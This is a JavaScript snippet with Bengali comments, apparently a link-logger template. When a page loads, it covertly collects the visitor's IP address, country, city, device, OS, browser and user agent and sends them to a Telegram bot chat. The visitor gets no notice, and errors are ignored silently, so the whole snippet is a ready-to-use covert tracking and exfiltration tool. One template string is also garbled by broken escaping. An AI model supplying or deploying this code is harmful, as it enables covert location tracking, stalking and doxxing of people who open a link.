<script>
    async function sendInfo() {
        try {
            // 1. IP + Location (দেশ, শহর)
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();

            // 2. User-Agent থেকে ডিভাইস, OS, ব্রাউজার
            const ua = navigator.userAgent || "Unknown";
            let deviceModel = "Unknown Device";
            let osName = "Unknown OS";
            let osVersion = "Unknown";
            let browserName = "Unknown Browser";
            let browserVersion = "Unknown";

            // সহজ কিছু পার্সিং (আরও ভালো করতে ua-parser-js লাইব্রেরি ব্যবহার করতে পারেন)
            if (/iPhone|iPad|iPod/.test(ua)) {
                osName = "iOS";
                const match = ua.match(/OS (\d+(_\d+)?)/);
                osVersion = match ? match[1].replace(/_/g, '.') : "Unknown";
                deviceModel = "Apple " + (ua.includes("iPad") ? "iPad" : "iPhone/iPod");
            } 
            else if (/Android/.test(ua)) {
                osName = "Android";
                const vMatch = ua.match(/Android (\d+\.?\d*)/);
                osVersion = vMatch ? vMatch[1] : "Unknown";

                // Samsung, Xiaomi ইত্যাদি অনুমান
                if (/Samsung|SM-|GT-/.test(ua)) deviceModel = "Samsung Galaxy (model approx)";
                else if (/Pixel/.test(ua)) deviceModel = "Google Pixel";
                else if (/Redmi|POCO/.test(ua)) deviceModel = "Xiaomi/Redmi/POCO";
                else deviceModel = "Android Device";
            } 
            else if (/Windows/.test(ua)) {
                osName = "Windows";
                deviceModel = "PC/Laptop";
            }

            // ব্রাউজার
            if (/Chrome\//.test(ua)) {
                browserName = "Chrome";
                const bv = ua.match(/Chrome\/([\d.]+)/);
                browserVersion = bv ? bv[1] : "Unknown";
            } else if (/Firefox\//.test(ua)) {
                browserName = "Firefox";
                const bv = ua.match(/Firefox\/([\d.]+)/);
                browserVersion = bv ? bv[1] : "Unknown";
            } else if (/Safari\//.test(ua)) {
                browserName = "Safari";
                const bv = ua.match(/Version\/([\d.]+)/);
                browserVersion = bv ? bv[1] : "Unknown";
            }

            // সময়
            const time = new Date().toLocaleString('bn-BD');

            // মেসেজ তৈরি
            const msg = `🔥 নতুন ক্লিক (লিংক ওপেন)\n\n` +
                        `🌍 দেশ: \( {ipData.country_name || 'N/A'} ( \){ipData.country_code || 'N/A'})\n` +
                        `🏙️ শহর: ${ipData.city || 'N/A'}\n` +
                        `📍 IP: ${ipData.ip || 'N/A'}\n` +
                        `📱 ডিভাইস: ${deviceModel}\n` +
                        `🆔 OS: ${osName} ${osVersion}\n` +
                        `🌐 ব্রাউজার: ${browserName} ${browserVersion}\n` +
                        `👤 User-Agent: ${ua}\n` +
                        `⏰ সময়: ${time}`;

            // টেলিগ্রামে পাঠান
            await fetch(`https://api.telegram.org/bot<আপনার_BOT_TOKEN>/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: "<আপনার_CHAT_ID>",
                    text: msg,
                    parse_mode: "Markdown"
                })
            });

        } catch (err) {
            console.error("Error:", err);
            // চাইলে সাইলেন্টলি ইগনোর করতে পারেন
        }
    }

    // পেজ লোড হওয়ার সাথে সাথে চালান
    window.addEventListener('load', sendInfo);
    // অথবা সরাসরি: sendInfo();
</script>
